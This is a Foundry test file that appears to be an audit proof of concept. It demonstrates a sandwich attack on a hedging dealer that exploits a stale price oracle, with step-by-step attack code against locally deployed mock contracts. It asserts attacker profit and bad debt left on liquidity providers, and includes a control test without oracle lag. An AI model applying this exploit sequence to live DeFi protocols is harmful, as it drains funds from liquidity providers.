// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {PriceOracle} from "../src/PriceOracle.sol";
import {SpotPool} from "../src/SpotPool.sol";
import {MarginLedger} from "../src/MarginLedger.sol";
import {PerpEngine} from "../src/PerpEngine.sol";
import {HedgingDealer} from "../src/HedgingDealer.sol";

contract HedgeSandwichTest is Test {
    MockERC20 wethMock;
    MockERC20 usdcMock;
    PriceOracle oracle;
    SpotPool pool;
    MarginLedger ledger;
    PerpEngine engine;
    HedgingDealer dealer;

    address lp = makeAddr("LP");
    address attacker = makeAddr("Attacker");

    uint256 constant WAD = 1e18;
    uint256 constant TRUE_PRICE = 4_000 * WAD; // real pool price of ETH
    uint256 constant STALE_ORACLE_PRICE = 3_720 * WAD; // -7% oracle stale price
    uint256 constant BAND_RATIO = 1e17; // +/-10% price band

    function _deploy(uint256 oraclePrice) public {
        wethMock = new MockERC20("Wrapped ETH Mock", "wETH");
        usdcMock = new MockERC20("USDC Mock", "USDC");

        oracle = new PriceOracle(oraclePrice, 1_000); // arbitrary baseline publish time
        pool = new SpotPool(wethMock, usdcMock);
        ledger = new MarginLedger(usdcMock, oracle);
        engine = new PerpEngine(ledger, oracle, BAND_RATIO);
        ledger.setEngine(address(engine));
        dealer = new HedgingDealer(
            wethMock,
            usdcMock,
            pool,
            ledger,
            address(engine)
        );

        wethMock.mint(address(this), 1_000 ether);
        usdcMock.mint(address(this), 4_000_000 ether);
        wethMock.approve(address(pool), type(uint256).max);
        usdcMock.approve(address(pool), type(uint256).max);
        pool.seed(1_000 ether, 4_000_000 ether); // price = 4,000,000/1,000 = $4,000

        wethMock.mint(lp, 2_000 ether);
        vm.startPrank(lp);
        wethMock.approve(address(dealer), type(uint256).max);
        dealer.lpDeposit(2_000 ether);
        vm.stopPrank();

        usdcMock.mint(attacker, 300_000 ether);
        vm.startPrank(attacker);
        usdcMock.approve(address(ledger), type(uint256).max);
        usdcMock.approve(address(pool), type(uint256).max);
        wethMock.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function _wealth(
        address who,
        uint256 price
    ) internal view returns (int256) {
        int256 tokenValue = int256(usdcMock.balanceOf(who)) +
            (int256(wethMock.balanceOf(who)) * int256(price)) /
            int256(WAD);
        return tokenValue + ledger.getAccountValue(who, price);
    }

    function test_SkewAndUnwindExampleWithinProfitSpace() public {
        _deploy(STALE_ORACLE_PRICE);

        int256 wealthBefore = _wealth(attacker, oracle.getPrice());

        vm.startPrank(attacker);
        ledger.deposit(attacker, 20_000 ether);

        // Skew the pool
        uint256 usdToSkew = 10_000 ether;
        uint256 ethBought = pool.swapExactQuoteForBase(usdToSkew);
        console2.log("Pool price after skew: ", pool.spotPrice());

        // Open short perp
        uint256 shortSize = 36 ether;
        (int256 base, int256 quote) = engine.openPosition(
            dealer,
            true,
            shortSize
        );
        uint256 fillPrice = (uint256(quote) * WAD) / uint256(-base);
        console2.log("Dealer hedge fill price:", fillPrice);

        // Unskew pool
        pool.swapExactBaseForQuote(ethBought);
        console2.log("Pool price after unskew:", pool.spotPrice());

        vm.stopPrank();

        int256 wealthAfterSandwich = _wealth(attacker, oracle.getPrice());
        console2.log("Attacker has before:", wealthBefore);
        console2.log("Attacker has after:", wealthAfterSandwich);

        assertGt(
            fillPrice,
            oracle.getPrice(),
            "fill should be above the oracle reading"
        );
        assertLe(
            fillPrice,
            (oracle.getPrice() * (WAD + BAND_RATIO)) / WAD,
            "fill should still be inside the band"
        );
        assertGt(
            wealthAfterSandwich,
            wealthBefore,
            "attacker should be better off after the sandwich"
        );

        // Attacker withdraw
        uint256 usdBeforeWithdraw = usdcMock.balanceOf(attacker);
        int256 accountValueAtStale = ledger.getAccountValue(
            attacker,
            oracle.getPrice()
        );
        vm.prank(attacker);
        ledger.withdraw(uint256(accountValueAtStale) - 1); // leave $1 of margin behind
        uint256 usdAfterWithdraw = usdcMock.balanceOf(attacker);

        // Profit assertion
        int256 totalRealizedUsd = int256(usdAfterWithdraw) - 300_000e18;
        console2.log("USDC withdrawn:", usdAfterWithdraw - usdBeforeWithdraw);
        console2.log("Realized profit:", totalRealizedUsd);
        assertGt(totalRealizedUsd, 0, "attacker walks away with profit");

        // The position is bad debt falling on the LPs
        oracle.setPrice(TRUE_PRICE, 2_000);
        int256 accountValueAtTrue = ledger.getAccountValue(
            attacker,
            TRUE_PRICE
        );
        console2.log(
            "Account value when oracle refreshes:",
            accountValueAtTrue
        );
        assertLt(accountValueAtTrue, 0, "bad debt");
    }

    // Test to show there is no profit when oracle isn't stale
    function test_PureSandwich_WithoutOracleDivergence_IsNotProfitable()
        public
    {
        _deploy(TRUE_PRICE);

        int256 wealthBefore = _wealth(attacker, oracle.getPrice());

        vm.startPrank(attacker);
        ledger.deposit(attacker, 20_000 ether);
        uint256 ethBought = pool.swapExactQuoteForBase(10_000 ether);
        engine.openPosition(dealer, true, 36 ether);
        pool.swapExactBaseForQuote(ethBought);
        vm.stopPrank();

        int256 wealthAfter = _wealth(attacker, oracle.getPrice());
        console2.log(
            "Profit without stale oracle:",
            wealthAfter - wealthBefore
        );

        assertLt(wealthAfter, wealthBefore, "Only outcome is loss");
    }
}
